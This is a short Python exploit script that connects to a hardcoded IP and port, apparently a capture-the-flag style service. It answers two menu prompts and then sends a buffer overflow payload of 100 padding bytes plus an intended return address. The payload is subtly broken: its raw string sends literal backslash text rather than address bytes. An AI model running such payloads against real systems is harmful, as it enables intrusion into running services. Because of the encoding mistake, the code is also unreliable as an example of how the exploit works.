from __future__ import print_function
import socket
from contextlib import closing
import re


def main():
    host = '110.10.212.130'
    port = 8888
    bufsize = 4096
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    with closing(sock):
        sock.connect((host, port))
        byte_content = sock.recv(bufsize)
        unicode_string = byte_content.decode('utf-8')
        print(unicode_string)
        sock.send("1".encode('utf-8'))
        byte_content1 = sock.recv(bufsize)
        unicode_string1 = byte_content1.decode('utf-8')
        print(unicode_string1)
        sock.send("1".encode('utf-8'))
        byte_content2 = sock.recv(bufsize)
        unicode_string2 = byte_content2.decode('utf-8')
        print(unicode_string2)
        str = "a" * 100 + r"\\x09\\x85\\x04\\x08"
        sock.send(str.encode('utf-8'))
        byte_content2 = sock.recv(bufsize)
        unicode_string2 = byte_content2.decode('utf-8')
        print(unicode_string2)

    return


if __name__ == '__main__':
    main()
